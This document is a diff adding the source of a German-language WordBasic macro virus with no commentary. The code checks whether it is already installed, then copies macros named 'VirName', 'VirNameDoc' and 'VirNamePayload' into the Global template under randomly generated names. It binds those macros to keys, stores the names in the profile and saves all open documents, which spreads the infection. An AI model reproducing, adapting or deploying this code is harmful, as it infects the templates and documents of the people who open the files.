@@ -1,0 +1,169 @@
+Sub MAIN
+On Error Goto Done
+
+A$ = DateiName$()
+If A$ = "" Then Goto Finish
+
+If CheckInstalled = 0 Then
+	Routine
+	Crypt
+	PayloadMakro
+	DateiAllesSpeichern 1, 1
+Else
+	Goto Done
+End If
+
+Done:
+A$ = DateiName$()
+If A$ = "" Then
+	Goto Finish
+Else
+	Einfügen " "
+End If
+
+Finish:
+End Sub
+
+Sub Crypt
+One = 7369
+Two = 9291
+Num = Int(Rnd() * (Two - One) + One)
+A$ = Str$(Num)
+A$ = LTrim$(A$)
+
+Beginn = Stunde(Jetzt())
+B$ = Str$(Beginn)
+B$ = LTrim$(B$)
+
+If B$ = "1" Then C$ = "A"
+If B$ = "2" Then C$ = "B"
+If B$ = "3" Then C$ = "C"
+If B$ = "4" Then C$ = "D"
+If B$ = "5" Then C$ = "E"
+If B$ = "6" Then C$ = "F"
+If B$ = "7" Then C$ = "G"
+If B$ = "8" Then C$ = "H"
+If B$ = "9" Then C$ = "I"
+If B$ = "10" Then C$ = "J"
+If B$ = "11" Then C$ = "K"
+If B$ = "12" Then C$ = "L"
+If B$ = "13" Then C$ = "M"
+If B$ = "14" Then C$ = "N"
+If B$ = "15" Then C$ = "O"
+If B$ = "16" Then C$ = "P"
+If B$ = "17" Then C$ = "Q"
+If B$ = "18" Then C$ = "R"
+If B$ = "19" Then C$ = "S"
+If B$ = "20" Then C$ = "T"
+If B$ = "21" Then C$ = "U"
+If B$ = "22" Then C$ = "V"
+If B$ = "23" Then C$ = "W"
+If B$ = "00" Then C$ = "X"
+
+E$ = C$ + A$
+ZU$ = AbrufenDokumentVar$("VirNameDoc")
+PG$ = FensterName$() + ":" + ZU$
+MakroKopieren PG$, "Global:" + E$, 1
+SetProfileString "Intl", "Name2", E$
+ExtrasAnpassenTastatur .TastenSchlüssel = 69, .Kategorie = 2, .Name = E$, .Hinzufügen, .Kontext = 0
+End Sub
+
+
+Sub Routine
+One = 7369
+Two = 9291
+Num = Int(Rnd() * (Two - One) + One)
+A$ = Str$(Num)
+A$ = LTrim$(A$)
+
+Beginn = Stunde(Jetzt())
+B$ = Str$(Beginn)
+B$ = LTrim$(B$)
+
+If B$ = "1" Then C$ = "A"
+If B$ = "2" Then C$ = "B"
+If B$ = "3" Then C$ = "C"
+If B$ = "4" Then C$ = "D"
+If B$ = "5" Then C$ = "E"
+If B$ = "6" Then C$ = "F"
+If B$ = "7" Then C$ = "G"
+If B$ = "8" Then C$ = "H"
+If B$ = "9" Then C$ = "I"
+If B$ = "10" Then C$ = "J"
+If B$ = "11" Then C$ = "K"
+If B$ = "12" Then C$ = "L"
+If B$ = "13" Then C$ = "M"
+If B$ = "14" Then C$ = "N"
+If B$ = "15" Then C$ = "O"
+If B$ = "16" Then C$ = "P"
+If B$ = "17" Then C$ = "Q"
+If B$ = "18" Then C$ = "R"
+If B$ = "19" Then C$ = "S"
+If B$ = "20" Then C$ = "T"
+If B$ = "21" Then C$ = "U"
+If B$ = "22" Then C$ = "V"
+If B$ = "23" Then C$ = "W"
+If B$ = "00" Then C$ = "X"
+
+D$ = C$ + A$
+UZ$ = AbrufenDokumentVar$("VirName")
+GP$ = FensterName$() + ":" + UZ$
+MakroKopieren GP$, "Global:" + D$, 1
+SetProfileString "Intl", "Name", D$
+ExtrasAnpassenTastatur .TastenSchlüssel = 32, .Kategorie = 2, .Name = D$, .Hinzufügen, .Kontext = 0
+End Sub
+
+Sub PayloadMakro
+One = 7369
+Two = 9291
+Num = Int(Rnd() * (Two - One) + One)
+A$ = Str$(Num)
+A$ = LTrim$(A$)
+
+Beginn = Stunde(Jetzt())
+B$ = Str$(Beginn)
+B$ = LTrim$(B$)
+
+If B$ = "1" Then C$ = "A"
+If B$ = "2" Then C$ = "B"
+If B$ = "3" Then C$ = "C"
+If B$ = "4" Then C$ = "D"
+If B$ = "5" Then C$ = "E"
+If B$ = "6" Then C$ = "F"
+If B$ = "7" Then C$ = "G"
+If B$ = "8" Then C$ = "H"
+If B$ = "9" Then C$ = "I"
+If B$ = "10" Then C$ = "J"
+If B$ = "11" Then C$ = "K"
+If B$ = "12" Then C$ = "L"
+If B$ = "13" Then C$ = "M"
+If B$ = "14" Then C$ = "N"
+If B$ = "15" Then C$ = "O"
+If B$ = "16" Then C$ = "P"
+If B$ = "17" Then C$ = "Q"
+If B$ = "18" Then C$ = "R"
+If B$ = "19" Then C$ = "S"
+If B$ = "20" Then C$ = "T"
+If B$ = "21" Then C$ = "U"
+If B$ = "22" Then C$ = "V"
+If B$ = "23" Then C$ = "W"
+If B$ = "00" Then C$ = "X"
+
+K$ = C$ + A$
+ZUZ$ = AbrufenDokumentVar$("VirNamePayload")
+GP$ = FensterName$() + ":" + ZUZ$
+MakroKopieren GP$, "Global:" + K$, 1
+SetProfileString "Intl", "Name3", K$
+End Sub
+
+Function CheckInstalled
+CC$ = GetProfileString$("Intl", "Name")
+    CheckInstalled = 0
+    If ZählenMakros(0) > 0 Then
+        For i = 1 To ZählenMakros(0)
+            If MakroName$(i, 0) = CC$ Then
+                CheckInstalled = 1
+            End If
+        Next i
+    End If
+End Function
